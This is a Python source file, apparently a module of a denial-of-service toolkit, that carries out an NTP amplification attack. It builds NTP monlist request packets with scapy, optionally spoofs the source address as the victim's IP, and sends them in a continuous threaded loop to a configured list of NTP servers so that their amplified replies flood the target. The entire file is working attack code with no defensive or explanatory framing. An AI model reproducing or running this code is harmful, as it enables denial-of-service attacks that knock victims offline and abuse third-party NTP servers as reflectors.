import asyncio
import random
import socket
from scapy.all import IP, UDP, send
from src.attacks.base import AttackBase

class NtpAmplification(AttackBase):
    async def attack_loop(self):
        print("Starte NTP Amplification Angriff...")
        ntp_monlist_request = bytes.fromhex(
            "17000204000000000000000000000000"
            "00000000000000000000000000000000"
            "00000000000000000000000000000000"
            "00000000000000000000000000000000"
        )
        from concurrent.futures import ThreadPoolExecutor
        loop = asyncio.get_event_loop()
        ntp_servers = []
        for server in self.config.ntp_servers:
            try:
                ip = socket.gethostbyname(server)
                ntp_servers.append(ip)
            except Exception:
                print(f"Konnte NTP-Server {server} nicht auflösen")
        if not ntp_servers:
            print("Keine NTP-Server verfügbar. Angriff wird beendet.")
            return
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            while not self.stop_event.is_set():
                ntp_server = random.choice(ntp_servers)
                src_ip = self.config.target if self.config.use_ip_spoofing else None
                src_port = self._get_random_port()
                ip_params = {"dst": ntp_server}
                if src_ip:
                    ip_params["src"] = src_ip
                ntp_packet = IP(**ip_params) / UDP(sport=src_port, dport=123) / ntp_monlist_request
                if self.task_queue:
                    await self.task_queue.put((
                        lambda pkt=ntp_packet: send(pkt, verbose=False),
                        ()
                    ))
                else:
                    await loop.run_in_executor(
                        executor,
                        lambda pkt=ntp_packet: send(pkt, verbose=False)
                    )
                self.stats.update_sent(1, len(ntp_monlist_request) + 28)
                await asyncio.sleep(0.05)
